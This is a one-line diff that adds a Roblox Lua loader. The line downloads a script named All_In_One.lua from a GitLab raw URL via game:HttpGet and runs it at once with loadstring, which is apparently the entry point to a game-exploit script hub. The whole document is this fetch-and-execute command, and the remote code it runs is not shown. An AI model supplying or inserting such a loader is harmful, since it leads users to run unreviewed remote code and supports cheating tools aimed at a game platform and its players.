@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gitlab.com/vugiakhiem/Scripts/-/raw/main/All_In_One.lua"))()
